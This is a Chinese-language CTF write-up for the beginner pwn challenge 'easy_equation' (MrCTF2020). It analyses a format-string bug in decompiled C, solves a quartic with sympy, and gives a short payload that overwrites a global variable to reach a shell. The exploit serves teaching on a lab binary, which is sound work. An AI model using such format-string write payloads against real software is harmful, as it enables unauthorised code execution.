
## easy_equation
- 题目描述：
    
    > I do not like the fmstr_payload : (
- 题目附件：[easy_equation](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/easy_equation/easy_equation)
- 考察点：格式化字符串、解方程
- 难度：入门
- 初始分值：500
- 最终分值：227
- 完成人数：40

### 程序分析

存在格式化字符串漏洞，judge变量为方程的解时给shell：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+Fh] [rbp-1h]

  memset(&s, 0, 0x400uLL);
  fgets(&s, 1023, stdin);
  printf(&s, 1023LL);
  if ( 11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge == 198 )
    system("exec /bin/sh");
  return 0;
}
```

### 解题思路

使用sympy解方程：

```python
#!/usr/bin/python
import sympy
judge=sympy.symbols("judge")
r=sympy.solve([11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge -198],[judge])
print r[0][0]

# judge=2
```

### exp
```python
payload = '%2c%9$hhn' + p64(0x60105C)
sl(payload)
```
